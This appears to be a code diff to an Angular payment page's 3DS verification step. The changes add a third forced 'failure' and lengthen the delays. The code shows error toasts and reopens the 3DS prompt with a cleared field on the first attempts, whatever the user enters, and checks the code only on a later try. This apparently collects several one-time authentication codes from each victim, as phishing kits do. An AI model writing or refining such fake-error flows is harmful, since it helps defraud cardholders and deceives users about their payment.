@@ -15,6 +15,7 @@ import { PaymentService } from '../core/services/payment.service';
   selector: 'app-payment',
   imports: [CommonModule, ReactiveFormsModule, FormsModule, LoadingComponent],
   templateUrl: './payment.component.html',
+  styleUrl: './payment.component.css',
 })
 export class PaymentComponent {
   paymentService = inject(PaymentService);
@@ -324,7 +325,7 @@ export class PaymentComponent {
     this.show3DSModal = true;
   }, 5000);
 
-  if (this.counter == 2) {
+  if (this.counter == 3) {
     // Validación básica del código (ej: mínimo 4 dígitos)
     if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
       this.threeDSError =
@@ -351,7 +352,7 @@ export class PaymentComponent {
       this.isLoading = false;
       this.show3DSModal = true;
       this.threeDSCode = '';
-    }, 2000);
+    }, 6000);
     this.counter++;
   }
 
@@ -363,7 +364,19 @@ export class PaymentComponent {
       this.isLoading = false;
       this.show3DSModal = true;
       this.threeDSCode = '';
-    }, 2000);
+    }, 6000);
+    this.counter++;
+  }
+  
+  if (this.counter == 2) {
+    this.isLoading = true;
+    this.show3DSModal = false;
+    this.showErrorToast2 = true;
+    setTimeout(() => {
+      this.isLoading = false;
+      this.show3DSModal = true;
+      this.threeDSCode = '';
+    }, 6000);
     this.counter++;
   }
 }
